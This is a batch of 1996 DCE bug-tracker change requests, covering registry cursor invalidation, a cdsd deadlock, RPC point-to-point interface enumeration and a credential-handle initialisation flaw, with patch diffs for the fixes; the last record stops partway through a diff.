Component Name                : sec
Subcomponent Name             : principal_catalog
Short Description             : rgy cursors can get trashed
Reported Date                 : 2/28/96
Found in Baseline             : 1.1
Found Date                    : 2/28/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : admin/dcecp/rgy.c
Sensitivity                   : public

[2/28/96 public]
We have encountered a problem with registry cursors, specifically in
sec_rgy_pgo_get_next(), but I believe the problem is not specific to
that function but general to all of the functions which use a
sec_rgy_cursor_t for looking up registry entries.
 
The problem is that it is possible to delete the registry entry that a
cursor points at, thus trashing the cursor out from under its owner.

When this occurs, (a) the function in question returns with status
sec_rgy_pgo_not_found (which, at least in the case of
sec_rgy_pgo_get_next, is not documented as one of the possible
results), and (b) the cursor is no longer usable.

Clearly, this is more important for some functions than it is for
others; it means that it is difficult to use a cursor to get an
accurate picture of what is actually in the registry database.
Certainly, it is to be expected that it is hard to get an accurate
snapshot of a database that is changing while it is being examined,
but part (b) means that functions taking that snapshot may actually be
interrupted.  (IMHO, it would be preferable to return an out-of-date
snapshot rather than interrupt the cursor sweep.)

It seems that the fix for this is rather complicated; a "bulletproof"
fix would probably involve using context handles to maintain some
state in the server about where cursors point (they could lock the
pointed-to objects, or advance cursors when pointed-to objects are
deleted, for example).  This, of course, would involve a new cursor
type and new cursor-related functions.

A workaround for the meantime is probably to document
sec_rgy_object_not_found as a possible return status from
sec_rgy_pgo_get_next() and to change dcecp's principal_catalog()
function to expect and deal with this error code.
 
Here is a diff for dcecp:

*** admin/dcecp/rgy.c
--- 12.9        1996/02/22 19:31:41
***************
*** 878,883 ****
--- 887,893 ----
      int                  pargc = 0;
      char                 **pargv;
      int                  i = 0;
+     int                  saved_length;
      boolean32            simplename = FALSE;
 
      dcp_ArgvInfo arg_table[] = {
***************
*** 932,943 ****
--- 942,965 ----
 
          if(strlen(interp->result))
              Tcl_AppendResult(interp,"\n",NULL);
+       saved_length = strlen(interp->result);
 
          for( result = error_status_ok; result == error_status_ok ;){
              sec_rgy_pgo_get_next(rgy_context,sec_rgy_domain_person,name,
                                   &item_cursor,&pgo_item,name1,&result);
              if(result == sec_rgy_no_more_entries)
                  continue;
+           if(result == sec_rgy_object_not_found) {
+               /* If we get this result code, the cursor has been trashed */
+               /* because someone deleted the element out from under it.  */
+               /* In that situation, all we can do is start over.  Fooey. */
+               sec_rgy_cursor_reset(&item_cursor);
+               strcpy((char *)name,"");
+               strcpy((char *)name1,"");
+               interp->result[saved_length] = '\0';
+               result = error_status_ok;
+               continue;
+           }
              if (result != sec_rgy_status_ok)
                  free(pargv);
              DCP_CHECK_SEC_ERROR(result);



CR Number                     : 13376
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : hcells
Short Description             : disconecting Hcells.
Reported Date                 : 2/28/96
Found in Baseline             : 1.1
Found Date                    : 2/28/96
Severity                      : B
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/28/96 public]

Once H-cell connectivity is set up (cdsalias connect), there is no way
that this connectivity can be broken in DCE 1.1, with cell renaming 
(cellalisa set) disabled. Although connectivity can be partially broken by 
deleting the child pointer in the parent cell's /.:, child cells /.: Parent
Pointer are not updated. I suggest "cdsalias disconect" enhancement to do this.

[2/28/96 public]

From dcecp this amounts to(in child cell - /.../parent/child):

dcecp>directory modify /.: -remove {CDS_ParentCellPointers} -type
dcecp>directory remove  </.../parent>  -member child



CR Number                     : 13374
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13347
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : 
Short Description             : ENDGAME: Change way libdcedfs build is turned off
Reported Date                 : 2/26/96
Found in Baseline             : 1.2.1
Found Date                    : 2/26/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : src/Makefile
					src/file/libdcedfs/Makefile
Sensitivity                   : public

[2/26/96 public]
Change the way libdcedfs build is disabled.  OT 13347 disabled
building libdcedfs by making changes in src/Makefile, but a better 
way is to make changes in src/file/libdcedfs/Makefile. Remember to
undo the changes in src/Makefile.



CR Number                     : 13370
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : 
Short Description             : Odd spacing in acl entry lists
leads to undesirable results
Reported Date                 : 2/24/96
Found in Baseline             : 1.1, 1.2
Found Date                    : 2/24/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/24/96 public]

A support customer reported the following problem:
--------------------------------------------------

Component Name:         dcecp
 
Date of First Occurrence: Jan 15, 1996

One Line Description: Odd spacing in acl entry lists yield undesirable results.
 
Full Description:
 
        For example, attempting to modify a cds directory acl:
            dcecp> acl modify /.:/x -change {any_other  rwdtcia}
            dcecp> # Note the two spaces here --------^^
            dcecp> acl show /.:/x
            {unauthenticated r--t---}
            {user cell_admin rwdtcia}
            {user hosts/crock/cds-server rwdtcia}
            {group subsys/dce/cds-admin rwdtcia}
            {group subsys/dce/cds-server rwdtcia}
            {any_other -------}

[2/26/96 public]

Verified in dcecp 1.2...

      dcecp> acl show /.:/hosts/blech
      {unauthenticated r--t---}
      {user cell_admin rwdtcia}
      {user hosts/bagomon/cds-server rwdtcia}
      {user hosts/blech/self rwdtcia}
      {group subsys/dce/cds-admin rwdtcia}
      {group subsys/dce/cds-server rwdtcia}
      {any_other r--t---}
      dcecp>
      dcecp> acl modify /.:/hosts/blech -change {any_other  rwdtcia}
      dcecp>
      dcecp> acl show /.:/hosts/blech
      {unauthenticated r--t---}
      {user cell_admin rwdtcia}
      {user hosts/bagomon/cds-server rwdtcia}
      {user hosts/blech/self rwdtcia}
      {group subsys/dce/cds-admin rwdtcia}
      {group subsys/dce/cds-server rwdtcia}
      {any_other -------}
      dcecp>



CR Number                     : 13368
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : clock skew error after 2 invalid bindings
Reported Date                 : 2/24/96
Found in Baseline             : 1.1
Found Date                    : 2/24/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/24/96 public]

A support customer reported the following problem:
-------------------------------------------------

On Line Description : 
	dce_login produces "Clock skew too great" error if it access 
	more than two bad bindings.

Full Description : 
	dce_login produces "Clock skew too great" error after trying
	two invalid bindings even though successfully contacting
	an secd with a third binding. It appears that the start time
	of the communication is not reset after a binding fails 
	to work.
	How to recreate the problem : 
	1. Edit the pe_site file to have as its first two entry
   	   unreachable ip address. Have as the third entry a valid
   	   ip address,
	2. Set the environment variable BIND_PE_SITE to 1
	3. Execute dce_login cell_admin <password>
	4. The following error message appears after a delay:

	Sorry.
	Password Validation Failure. - status 0x14129025 (dce / krb)

[3/5/96 public]

I am unable to reproduce this problem on 1.2.1. Does this customer have
access to 1.2.1 code? If so, please have them retry with the new code. 

I created a pe_site file with six invalid entries in it. After a several
minute delay, my login succeeded. I will wait for further information
before continuing on this problem.



CR Number                     : 13367
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cds/server
Short Description             : cdsd deadlock
Reported Date                 : 2/24/96
Found in Baseline             : 1.1
Found Date                    : 2/24/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/24/96 public]

A support customer reported the following problem:
--------------------------------------------------

< edited version of DCE problem Report >

Date of First Occurrence: 06/24/95

Full Description:

Related-file:::: Problem
 DESCRIPTION:  This is present in 1.0 or 1.1.  There is a deadlock (and
 we hit it) in cdsd as follows.  If a skulk is in progress on a
 directory,  and a second one on the same directory is initiated, the
 second one will block and use the results of the first one.  While
 it's waiting, however, the second one still has the write count on the
 stream incremented.  The first one has reduced its access to read from
 write, in order to avoid blocking checkpont requests.  Admirable, but
 not always successful -- suppose a checkpoint is now initiated.  The
 checkpoint cannot yet proceed, because the writer count on the file is
 nonzero.  When the first skulk completes, and attempts to revert its
 access on the stream to Modify (from Read), it will be blocked in
 db_modify_stream_function, because there's a checkpoint attempt
 outstanding.  So it sleeps, and the other skulker never runs (and its
 write count remains outstanding) and the checkpoint never proceeds.
 The outstanding checkpoint also prevents any other modification ops
 from proceeding.
 
 
 REPRODUCIBLE:  Not easily, but we saw it once.
 
 DESCRIPTION OF WHERE TEST SUCCESSFULLY RAN:OB
 
 In db_modify_stream_function(), if changing to a modify operation
 when a checkpoint is pending, if other writes are outstanding, don't
 sleep, just proceed.
 
     *** /tmp/ci.14248..db_common.c.14288.1	Tue Jun 27 20:54:57 1995
     --- /tmp/db_common.c.14288.2	Tue Jun 27 20:54:57 1995
     ***************
     *** 626,635 ****
     --- 626,654 ----
                   while (file_p->file_state != file_open) {
                       if ((file_p->file_state == file_ckpt) &&
                           (new_function == OP_ReadAttribute)) {
                           break;
                       }
     + #ifdef hitm
     +                 /* avoid a bizarre deadlock -- if a checkpoint is
     +                  * desired, but someone else has a write on this file,
     +                  * it could be someone doing a skulk, which is what we
     +                  * are doing (only skulk calls this routine).  Such a
     +                  * skulker may have incremented the write count, and is
     +                  * then waiting for us to return and unset the skulk-
     +                  * in-progress flag.  If we wait here, we won't return,
     +                  * so the write count would stay positive, thus blocking
     +                  * the other skulker, who keeps the checkpoint from taking
     +                  * place.  Plus, the pending checkpoint keeps any
     +                  * other write ops from proceeding.
     +                  */
     + 
     +                 if ((file_p->file_state == file_ckpt) &&
     +                     (file_p->file_write_count > 0)) {
     +                     break;
     +                 }
     + #endif
                       if (file_p->file_state != file_ckpt) {
                           SERVER_END_LOCK(file_p->file_mutex);
                           DEBUG_EVENT(exit_db_modify_stream_function,
                               (" <db_modify_stream_function(%s, %d) return(%d)\n",
                               deb_ascii_db_stream(streamBuf, stream_p),
 
Related-file::Added 950627 by wright:: /build/hiosfm/RCS/dce1.1/src/directory/cds/server/./db_common.c,v 8.3
 /build/hiosfm/RCS/dce1.1/src/directory/cds/server/./db_common.c,v 8.3
 wright 1995/06/28 00:55:38 +22 -2
 Reason:  OSDqa11881 yet another bizarre cdsd deadlock (checkpoint during skulk)
 In db_modify_stream_function(), if changing to a modify operation
 when a checkpoint is pending, if other writes are outstanding, don't
 sleep, just proceed.
 
     *** /tmp/ci.14305..db_common.c.14350.1	Tue Jun 27 20:55:41 1995
     --- /tmp/db_common.c.14350.2	Tue Jun 27 20:55:41 1995
     ***************
     *** 731,740 ****
     --- 731,760 ----
                       if (file_p->file_state != file_ckpt) {
                           status = DNS_CLEARINGHOUSEDOWN;
       		    goto unlock_db_modify_stream_function;
                       }
       		
     + #ifdef hitm
     +                 /* avoid some bizarre deadlocks -- we're converting
     +                  * back to a write operation.  If there are any other
     +                  * write ops outstanding, just go ahead and do it.
     +                  * In general, the lock will be released shortly, so
     +                  * we might as well get out of the way; this can also
     +                  * prevent a nasty 3-way deadlock between an active
     +                  * skulker (in here), a blocked skulker (who has done
     +                  * an increment of file_write_count) and a checkpoint
     +                  * thread (which has set file_state to file_ckpt).  If
     +                  * we slept here, we'd never let the other skulker run,
     +                  * and so it won't decrement file_write_count, and the
     +                  * checkpoint will never run either, thus blocking all
     +                  * modify ops.
     +                  */
     + 
     +                 if ((file_p->file_write_count > 0)) {                    
     +                     break;
     +                 }
     + #endif
       		if ((thstatus = dthread_wait(&(file_p->file_state_changed),
       					     &(file_p->file_mutex))) < 0)
       		{
       		  dce_svc_printf(CDS_S_PTHREADCONDWAIT_A_MSG, (long)thstatus);
                       }
 
Related-file:::: Resolution 
 DESCRIPTION OF BUG FIX:  The simplest solution seemed to be to change
 db_modify_stream_function() to allow a caller to proceed if he's
 changing to a modify operation, but file_write_count > 0, even if a
 checkpoint is pending.
 
 Rationale:  the pending checkpoint is preventing new writers from
 entering, and this thread will be releasing its lock shortly anyway,
 so little delay is induced, and the deadlock is averted.  If
 file_write_count is zero, there are no potential deadlockers, and the
 checkpoint may have started, so have to sleep.



CR Number                     : 13366
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpc/runtime
Short Description             : point to point interfaces not working
Reported Date                 : 2/24/96
Found in Baseline             : 1.1
Found Date                    : 2/24/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/24/96 public]

A support customer reported the following problem:
--------------------------------------------------

<edited version from Customer Support Ticket>

Component (Module):     rpc/runtime/HITM/ipnaf_sys.c 

Date of First Occurrence: 10/20/94

 DESCRIPTION:
 
 The rpc runtime can't find a useable interface when the only interface
 is a point to point interface.  The runtime routine
 enumerate_interfaces() lists and sorts the interfaces as they are found
 into a vector array.  The p2p interafces are loaded into the end of the
 array and then later shuffled into empty slots in the middle of the
 array.  This logic appears to be broke.
 

 DESCRIPTION OF WHERE TEST SUCCESSFULLY RAN:
 
 The enumerate_interfaces routine (in ipnaf_sys.c, taken from the RIOS
 version) did not work correctly.
 
     *** /tmp/ci.6334..ipnaf_sys.c.6368.1	Tue Jun 20 15:15:21 1995
     --- /tmp/ipnaf_sys.c.6368.2	Tue Jun 20 15:15:22 1995
     ***************
     *** 290,300 ****
     --- 290,302 ----
           {
               if (err == EINTR)
               {
                   goto ifconf_again;
               }
     + #ifdef hitm
       	free(buf);
     + #endif
               *status = -2;   /* !!! */
               return;
           }
       
           /*
     ***************
     *** 319,329 ****
     --- 321,333 ----
               RPC_C_MEM_RPC_ADDR_VEC,
               RPC_C_MEM_WAITOK);
           
           if (*rpc_addr_vec == NULL)
           {
     + #ifdef hitm
       	free(buf);
     + #endif
               *status = rpc_s_no_memory;
               return;
           }
           if (netmask_addr_vec != NULL)
           {
     ***************
     *** 497,557 ****
       	** slots in the middle of the array.  Each time we encounter a p2p
       	** interface we increment the np2p variable which (when subtracted
       	** from n_ifs-1) marks the last available slot in the array.
       	*/
       
     - #ifdef hitm  /* Don't put ptp's at end of array, may revisit later. */
     - /*        
     - #endif
               if (if_flags & IFF_POINTOPOINT) {
     !           (*rpc_addr_vec)->addrs[n_ifs-1-nptp++] = (rpc_addr_p_t) ip_addr;
                 if (netmask_addr_vec != NULL && netmask_addr != NULL)
     !               (*netmask_addr_vec)->addrs[n_ifs-1-nptp++]
                         = (rpc_addr_p_t) netmask_addr;
               } else {  
     - #ifdef hitm
     - */
     - #endif
                 (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++]=(rpc_addr_p_t) ip_addr;
     !           if (netmask_addr_vec != NULL && netmask_addr != NULL)
                     (*netmask_addr_vec)->addrs[(*netmask_addr_vec)->len++]
                         = (rpc_addr_p_t) netmask_addr;
     ! #ifdef hitm
     ! /*        } */
     ! #else
               }
     - #endif
           }
       
           /*
           ** Shuffle p2p interfaces at the end of the array into empty slots in the
           ** middle, if there are any.
           */
       
     - #ifdef hitm  /* no need to shuffle now.  May revisit later. */
     - /*    
     - #endif
           cnt = (*rpc_addr_vec)->len;
           if ((n_ifs - (cnt + nptp)) < nptp)
             stop = n_ifs - (cnt + nptp);
           else
             stop = nptp;
           stop += cnt;
       
           for (i = cnt, nptp = n_ifs - 1; i < stop; i++, nptp--) {
             (*rpc_addr_vec)->addrs[i] = (*rpc_addr_vec)->addrs[nptp];
     !       (*rpc_addr_vec)->addrs[nptp] = NULL;
             if (netmask_addr_vec != NULL)
             {
                 (*netmask_addr_vec)->addrs[i] = (*netmask_addr_vec)->addrs[nptp];
     !           (*netmask_addr_vec)->addrs[nptp] = NULL;
             }
           }
     - #ifdef hitm
     - */
     - #endif
       
       /* CMVC 3687 End */
       
       /*
       ** Prior to CMVC 3687
       **      (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++] = (rpc_addr_p_t) ip_addr;
     --- 501,550 ----
       	** slots in the middle of the array.  Each time we encounter a p2p
       	** interface we increment the np2p variable which (when subtracted
       	** from n_ifs-1) marks the last available slot in the array.
       	*/
       
               if (if_flags & IFF_POINTOPOINT) {
     !           (*rpc_addr_vec)->addrs[n_ifs-1-nptp] = (rpc_addr_p_t) ip_addr;
                 if (netmask_addr_vec != NULL && netmask_addr != NULL)
     !               (*netmask_addr_vec)->addrs[n_ifs-1-nptp]
                         = (rpc_addr_p_t) netmask_addr;
     +           nptp++;       /* hitm */
               } else {  
                 (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++]=(rpc_addr_p_t) ip_addr;
     !           if (netmask_addr_vec != NULL) /* netmask_addr will be valid */
                     (*netmask_addr_vec)->addrs[(*netmask_addr_vec)->len++]
                         = (rpc_addr_p_t) netmask_addr;
     ! 
               }
           }
       
           /*
           ** Shuffle p2p interfaces at the end of the array into empty slots in the
           ** middle, if there are any.
           */
       
           cnt = (*rpc_addr_vec)->len;
           if ((n_ifs - (cnt + nptp)) < nptp)
             stop = n_ifs - (cnt + nptp);
           else
             stop = nptp;
     + #ifndef hitm    /* wrong wrong wrong!  do not increase "stop" further! */
           stop += cnt;
     + #endif
       
           for (i = cnt, nptp = n_ifs - 1; i < stop; i++, nptp--) {
             (*rpc_addr_vec)->addrs[i] = (*rpc_addr_vec)->addrs[nptp];
     !       (*rpc_addr_vec)->len++;   /* no need to null addrs[nptp] */
             if (netmask_addr_vec != NULL)
             {
                 (*netmask_addr_vec)->addrs[i] = (*netmask_addr_vec)->addrs[nptp];
     !           (*netmask_addr_vec)->len++;   /* no need to null addrs[nptp] */
             }
           }
       
     + 
       /* CMVC 3687 End */
       
       /*
       ** Prior to CMVC 3687
       **      (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++] = (rpc_addr_p_t) ip_addr;
     ***************
     *** 559,569 ****
     --- 552,564 ----
       */
       
       #undef max
       #undef size
       
     + #ifdef hitm
           free(buf);
     + #endif
           *status = rpc_s_ok;
           return;
       
       FREE_IT:
       
     ***************
     *** 579,589 ****
     --- 574,586 ----
               {
                   RPC_MEM_FREE ((*netmask_addr_vec)->addrs[i], RPC_C_MEM_RPC_ADDR);
               }
               RPC_MEM_FREE (*netmask_addr_vec, RPC_C_MEM_RPC_ADDR_VEC);
           }
     + #ifdef hitm
           free(buf);
     + #endif
       }
       
       /*
       **++
       **
 
Related-file:::: Resolution 
 DESCRIPTION OF BUG FIX:  The enumerate_interfaces() routine had no
 fewer than three bugs in the code to handle point-to-point
 interfaces (we took our version from the RIOS version):
 
   1)  If there were both a rpc_addr_vec and a netmask_addr_vec,
       nptp would be incremented twice when a value was loaded
       into the arrays
   2)  The computation of "stop" incorrectly incremented stop by
       the value of "cnt."
   3)  The compression of the rpc_addr_vec and netmask_addr_vec
       arrays didn't adjust the vec->len values.  Instead, it
       pointlessly zeroed out the entries that had been shifted
       down in the array.
  
 REGRESSION TEST SCENARIO:  Just starting dced on a node with
 point-to-point interfaces should show very weird behavior.
 
 DESCRIPTION OF WHERE TEST SUCCESSFULLY RAN:
 
Related-file::Added 950620 by wright:: /build/hiosfm/RCS/dce1.1/src/rpc/runtime/HITM/./ipnaf_sys.c,v 8.3
 /build/hiosfm/RCS/dce1.1/src/rpc/runtime/HITM/./ipnaf_sys.c,v 8.3
 wright 1995/06/20 19:15:19 +20 -23
 Reason:  OSDqa09650 RPC runtime can't get useable interface with point to point.
 The enumerate_interfaces routine (in ipnaf_sys.c, taken from the RIOS
 version) did not work correctly.
 
     *** /tmp/ci.6334..ipnaf_sys.c.6368.1	Tue Jun 20 15:15:21 1995
     --- /tmp/ipnaf_sys.c.6368.2	Tue Jun 20 15:15:22 1995
     ***************
     *** 290,300 ****
     --- 290,302 ----
           {
               if (err == EINTR)
               {
                   goto ifconf_again;
               }
     + #ifdef hitm
       	free(buf);
     + #endif
               *status = -2;   /* !!! */
               return;
           }
       
           /*
     ***************
     *** 319,329 ****
     --- 321,333 ----
               RPC_C_MEM_RPC_ADDR_VEC,
               RPC_C_MEM_WAITOK);
           
           if (*rpc_addr_vec == NULL)
           {
     + #ifdef hitm
       	free(buf);
     + #endif
               *status = rpc_s_no_memory;
               return;
           }
           if (netmask_addr_vec != NULL)
           {
     ***************
     *** 497,557 ****
       	** slots in the middle of the array.  Each time we encounter a p2p
       	** interface we increment the np2p variable which (when subtracted
       	** from n_ifs-1) marks the last available slot in the array.
       	*/
       
     - #ifdef hitm  /* Don't put ptp's at end of array, may revisit later. */
     - /*        
     - #endif
               if (if_flags & IFF_POINTOPOINT) {
     !           (*rpc_addr_vec)->addrs[n_ifs-1-nptp++] = (rpc_addr_p_t) ip_addr;
                 if (netmask_addr_vec != NULL && netmask_addr != NULL)
     !               (*netmask_addr_vec)->addrs[n_ifs-1-nptp++]
                         = (rpc_addr_p_t) netmask_addr;
               } else {  
     - #ifdef hitm
     - */
     - #endif
                 (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++]=(rpc_addr_p_t) ip_addr;
     !           if (netmask_addr_vec != NULL && netmask_addr != NULL)
                     (*netmask_addr_vec)->addrs[(*netmask_addr_vec)->len++]
                         = (rpc_addr_p_t) netmask_addr;
     ! #ifdef hitm
     ! /*        } */
     ! #else
               }
     - #endif
           }
       
           /*
           ** Shuffle p2p interfaces at the end of the array into empty slots in the
           ** middle, if there are any.
           */
       
     - #ifdef hitm  /* no need to shuffle now.  May revisit later. */
     - /*    
     - #endif
           cnt = (*rpc_addr_vec)->len;
           if ((n_ifs - (cnt + nptp)) < nptp)
             stop = n_ifs - (cnt + nptp);
           else
             stop = nptp;
           stop += cnt;
       
           for (i = cnt, nptp = n_ifs - 1; i < stop; i++, nptp--) {
             (*rpc_addr_vec)->addrs[i] = (*rpc_addr_vec)->addrs[nptp];
     !       (*rpc_addr_vec)->addrs[nptp] = NULL;
             if (netmask_addr_vec != NULL)
             {
                 (*netmask_addr_vec)->addrs[i] = (*netmask_addr_vec)->addrs[nptp];
     !           (*netmask_addr_vec)->addrs[nptp] = NULL;
             }
           }
     - #ifdef hitm
     - */
     - #endif
       
       /* CMVC 3687 End */
       
       /*
       ** Prior to CMVC 3687
       **      (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++] = (rpc_addr_p_t) ip_addr;
     --- 501,550 ----
       	** slots in the middle of the array.  Each time we encounter a p2p
       	** interface we increment the np2p variable which (when subtracted
       	** from n_ifs-1) marks the last available slot in the array.
       	*/
       
               if (if_flags & IFF_POINTOPOINT) {
     !           (*rpc_addr_vec)->addrs[n_ifs-1-nptp] = (rpc_addr_p_t) ip_addr;
                 if (netmask_addr_vec != NULL && netmask_addr != NULL)
     !               (*netmask_addr_vec)->addrs[n_ifs-1-nptp]
                         = (rpc_addr_p_t) netmask_addr;
     +           nptp++;       /* hitm */
               } else {  
                 (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++]=(rpc_addr_p_t) ip_addr;
     !           if (netmask_addr_vec != NULL) /* netmask_addr will be valid */
                     (*netmask_addr_vec)->addrs[(*netmask_addr_vec)->len++]
                         = (rpc_addr_p_t) netmask_addr;
     ! 
               }
           }
       
           /*
           ** Shuffle p2p interfaces at the end of the array into empty slots in the
           ** middle, if there are any.
           */
       
           cnt = (*rpc_addr_vec)->len;
           if ((n_ifs - (cnt + nptp)) < nptp)
             stop = n_ifs - (cnt + nptp);
           else
             stop = nptp;
     + #ifndef hitm    /* wrong wrong wrong!  do not increase "stop" further! */
           stop += cnt;
     + #endif
       
           for (i = cnt, nptp = n_ifs - 1; i < stop; i++, nptp--) {
             (*rpc_addr_vec)->addrs[i] = (*rpc_addr_vec)->addrs[nptp];
     !       (*rpc_addr_vec)->len++;   /* no need to null addrs[nptp] */
             if (netmask_addr_vec != NULL)
             {
                 (*netmask_addr_vec)->addrs[i] = (*netmask_addr_vec)->addrs[nptp];
     !           (*netmask_addr_vec)->len++;   /* no need to null addrs[nptp] */
             }
           }
       
     + 
       /* CMVC 3687 End */
       
       /*
       ** Prior to CMVC 3687
       **      (*rpc_addr_vec)->addrs[(*rpc_addr_vec)->len++] = (rpc_addr_p_t) ip_addr;
     ***************
     *** 559,569 ****
     --- 552,564 ----
       */
       
       #undef max
       #undef size
       
     + #ifdef hitm
           free(buf);
     + #endif
           *status = rpc_s_ok;
           return;
       
       FREE_IT:
       
     ***************
     *** 579,589 ****
     --- 574,586 ----
               {
                   RPC_MEM_FREE ((*netmask_addr_vec)->addrs[i], RPC_C_MEM_RPC_ADDR);
               }
               RPC_MEM_FREE (*netmask_addr_vec, RPC_C_MEM_RPC_ADDR_VEC);
           }
     + #ifdef hitm
           free(buf);
     + #endif
       }
       
       /*
       **++
       **
 
Related-file:::: Resolution 
 DESCRIPTION OF BUG FIX:  The enumerate_interfaces() routine had no
 fewer than three stupid bugs in the code to handle point-to-point
 interfaces (we took our version from the RIOS version, which had
 clearly never been tested):
 
   1)  If there were both a rpc_addr_vec and a netmask_addr_vec,
       nptp would be incremented twice when a value was loaded
       into the arrays
   2)  The computation of "stop" incorrectly incremented stop by
       the value of "cnt."
   3)  The compression of the rpc_addr_vec and netmask_addr_vec
       arrays didn't adjust the vec->len values.  Instead, it
       pointlessly zeroed out the entries that had been shifted
       down in the array.
  
 Three bugs in about 25 lines; not bad.
 
 REGRESSION TEST SCENARIO:  Just starting dced on a node with
 point-to-point interfaces should show very weird behavior.

[ axg 2/24/96 public]

removed miscellaneous email correspondence



CR Number                     : 13365
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : security/utils
Short Description             : cred handle prematurely
declared via magic cookie
Reported Date                 : 2/24/96
Found in Baseline             : 1.1
Found Date                    : 2/24/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/24/96 public]

A support customer reported the following problem:
-------------------------------------------------

in security/utils/sec_cred_internal.c, the  sec__cred_create_authz_handle()
routine has two cases of returning without filling in  
authz_cred_handle->data .

Near the top of the routine, the clauses starting with :

if (auth_info->authz_svc == rpc_c_authz_none) {
and
if (auth_info->handle_type == sec__cred_handle_type_client) {

might lead to a return of 0 for status (it was cleared above), and 
would seem to be missing a statement:
	authz_cred_handle->data = (idl_void_p_t) cred_handle;
in each case.

I haven't yet figured out how to make this happen at-will, and any 
suggestions in that regard would be warmly received.


< mail from support customer - Tue, 21 Mar 1995 >
Subject: Re: Ticket#20949 possible problem with sec__cred_create_authz_handle

I may not have understood things completely with my original mail, 
but I eventually made the following changes in 
sec__cred_create_authz_handle():

The first change actually has to do with a different bug reported 
concerning a possibly nasty startup race with secd and login sessions 
using a cred handle prematurely declared legal via the magic cookie. 
It requires adding the initialization of magic fields in subsequent 
changes.

The returning of a valid data ptr in the next two changes  is, I think 
required.I can't say that I've knowingly been able to exercise this code, 
however.

*** 8.1	1995/03/16 02:53:42
- --- sec_cred_internal.c	1995/03/16 14:12:53
***************
*** 1,9 ****
  #if !defined(lint) && !defined(_NOIDENT) && !defined(rcsid_IV5_gE83r)
! static char rcsid_IV5_gE83r[]="@(#)$RCSfile: c013365,v $ $Revision: 1.1 $";
  #define rcsid_IV5_gE83r 1
  #endif
  /*
! $Id: c013365,v 1.1 96/02/24 13:16:34 root Exp $
  
  ----------------------------------------------------------------
   Copyright 1994 Hitachi, Ltd.
- --- 1,9 ----
  #if !defined(lint) && !defined(_NOIDENT) && !defined(rcsid_IV5_gE83r)
! static char rcsid_IV5_gE83r[]="@(#)$RCSfile: c013365,v $ $Revision: 1.1 $";
  #define rcsid_IV5_gE83r 1
  #endif
  /*
! $Id: c013365,v 1.1 96/02/24 13:16:34 root Exp $
  
  ----------------------------------------------------------------
   Copyright 1994 Hitachi, Ltd.
***************
*** 422,429 ****
      sec__cred_handle_t      *cred_handle = NULL;
      int                     i;
      error_status_t          rst;
! 
      authz_cred_handle->magic = AUTHZ_CRED_HANDLE_MAGIC;
      cred_handle = (sec__cred_handle_t *) MALLOC(sizeof(sec__cred_handle_t));
      if (cred_handle == NULL) {
  	return sec_s_no_memory;
- --- 422,430 ----
      sec__cred_handle_t      *cred_handle = NULL;
      int                     i;
      error_status_t          rst;
! #ifndef hitm
      authz_cred_handle->magic = AUTHZ_CRED_HANDLE_MAGIC;
+ #endif
      cred_handle = (sec__cred_handle_t *) MALLOC(sizeof(sec__cred_handle_t));
      if (cred_handle == NULL) {
  	return sec_s_no_memory;
***************
*** 450,455 ****
- --- 451,460 ----
  	 * result in sec_cred_s_authz_svc_cannot_comply errors
  	 */
  	cred_handle->auth_info.authz_svc = auth_info->authn_svc;
+ #ifdef hitm
+ 	authz_cred_handle->data = (idl_void_p_t) cred_handle;
+ 	authz_cred_handle->magic = AUTHZ_CRED_HANDLE_MAGIC;
+ #endif
